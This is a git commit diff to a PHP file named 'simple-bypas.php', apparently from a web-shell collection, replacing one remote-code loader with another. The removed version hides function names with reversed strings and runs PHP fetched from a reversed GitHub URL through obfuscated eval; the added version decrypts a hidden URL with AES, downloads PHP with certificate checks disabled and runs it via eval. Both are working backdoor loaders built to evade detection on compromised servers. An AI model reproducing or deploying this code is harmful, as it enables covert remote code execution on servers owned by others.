53cb1e6b1a64579fb618c4d66da680b596c3ee0f
NuLz <129581037+haxorstars@users.noreply.github.com>
2025-05-26 16:32:10 +0700

    NuLz

--- simple/simple-bypas.php
+++ simple/simple-bypas.php
@@ -1,123 +1,88 @@
 <?php
-session_start();
-error_reporting(0);
 
-class UrlFetcher
+class RemotePHPExecutor
 {
-    private $userAgent;
-    private $funcArray;
+    private $url;
+    private $code = null;
+    private $error = null;
 
-    public function __construct()
+    public function __construct($url)
     {
-        $this->userAgent = 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0';
-        $this->funcArray = array(
-            'crl' => array(
-                'exec' => strrev('cexe_lruc'),
-                'init' => strrev('tini_lruc'),
-                'opt' => strrev('tpotes_lruc'),
-                'close' => strrev('esolc_lruc')
-            ),
-            'file' => array(
-                'getContents' => strrev('stnetnoc_teg_elif'),
-                'open' => strrev('nepof'),
-                'streamContents' => strrev('stnetnoc_teg_maerts'),
-                'close' => strrev('esolcf')
-            )
-        );
+        $this->url = $url;
+        $this->fetchCode();
     }
 
-    private function obfuscate($data)
+    private function fetchCode()
     {
-        return base64_encode(strrev($data));
-    }
+        $code = $this->fetchUsingCurl();
 
-    private function deobfuscate($data)
-    {
-        return strrev(base64_decode($data));
-    }
-
-    private function getFunc($type, $name)
-    {
-        return $this->funcArray[$type][$name];
-    }
-
-    public function fetch($url)
-    {
-        $crl_exec = $this->getFunc('crl', 'exec');
-        $file_getContents = $this->getFunc('file', 'getContents');
-        $file_open = $this->getFunc('file', 'open');
-        $stream_getContents = $this->getFunc('file', 'streamContents');
-
-        if (function_exists($crl_exec)) {
-            goto use_crl;
-        } elseif (function_exists($file_getContents)) {
-            goto use_file;
-        } elseif (function_exists($file_open) && function_exists($stream_getContents)) {
-            goto use_fo;
-        } else {
-            goto no_function;
+        if ($code === false) {
+            $code = $this->fetchUsingFileGetContents();
         }
 
-        use_crl:
-        return $this->crlFetch($url);
-        goto end_fetch;
-
-        use_file:
-        return $file_getContents($url);
-        goto end_fetch;
-
-        use_fo:
-        return $this->foFetch($url);
-        goto end_fetch;
-
-        no_function:
-        return false;
-
-        end_fetch:
-        return null;
-    }
-
-    private function crlFetch($url)
-    {
-        $crl_init = $this->getFunc('crl', 'init');
-        $crl_opt = $this->getFunc('crl', 'opt');
-        $crl_close = $this->getFunc('crl', 'close');
-        $crl_exec = $this->getFunc('crl', 'exec');
-
-        $conn = $crl_init($url);
-        $crl_opt($conn, CURLOPT_RETURNTRANSFER, 1);
-        $crl_opt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        $crl_opt($conn, CURLOPT_USERAGENT, $this->userAgent);
-        $crl_opt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        $crl_opt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-        if (isset($_SESSION[$this->obfuscate('nulzganteng')])) {
-            $crl_opt($conn, CURLOPT_COOKIE, $_SESSION[$this->obfuscate('nulzganteng')]);
+        if ($code === false) {
+            $this->error = "Gagal mengambil konten dari URL: {$this->url}";
+            return;
         }
 
-        $url_get_contents_data = $crl_exec($conn);
-        $crl_close($conn);
-
-        return $url_get_contents_data;
+        $this->code = $code;
     }
 
-    private function foFetch($url)
+    private function fetchUsingCurl()
     {
-        $file_open = $this->getFunc('file', 'open');
-        $stream_getContents = $this->getFunc('file', 'streamContents');
-        $file_close = $this->getFunc('file', 'close');
+        if (!function_exists('curl_init')) {
+            return false;
+        }
 
-        $handle = $file_open($url, "r");
-        $url_get_contents_data = $stream_getContents($handle);
-        $file_close($handle);
+        $ch = curl_init($this->url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+        ]);
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
 
-        return $url_get_contents_data;
+        return ($httpCode === 200 && $result !== false) ? $result : false;
+    }
+
+    private function fetchUsingFileGetContents()
+    {
+        $context = stream_context_create([
+            "http" => ["follow_location" => 1, "timeout" => 10],
+            "https" => ["verify_peer" => false, "verify_peer_name" => false]
+        ]);
+
+        return @file_get_contents($this->url, false, $context);
+    }
+
+    public function render()
+    {
+        if (empty($this->code)) {
+            return $this->error ?: "Tidak ada konten untuk dijalankan.";
+        }
+
+        try {
+            ob_start();
+            eval("?>".$this->code);
+            return ob_get_clean();
+        } catch (Exception $e) {
+            return "Kesalahan saat mengeksekusi konten: " . $e->getMessage();
+        }
     }
 }
 
-$fetcher = new UrlFetcher();
-$nulzpro = strrev('php.elpmis/elpmis/niam/evihcra/sratsroxah/moc.tnetnocresubuhtig.war//:sptth');
-$nulzganteng = $fetcher->fetch($nulzpro);
+$this_data = ['6LJBHn6MhVyTeKcefARA8b2PjNG1I8SyRrvprW2ahi62nhcpVCgj3vl9AUPsWJNlJCBK7rJUtJEvx52dODIHbfksRs9KJyLfqYGh'];
 
-/****/@/*55555*/null; /******/@/*55555*/eval/*######*/('?>' . $nulzganteng);
+$key = "ewe";
+$token = "ewe";
+
+foreach ($this_data as $data_encrypted) {
+    $nulzganteng = openssl_decrypt($data_encrypted, "AES-128-CTR", $key, 0, $token);
+    $remote = new RemotePHPExecutor($nulzganteng);
+    echo $remote->render();
+}
+
 ?>
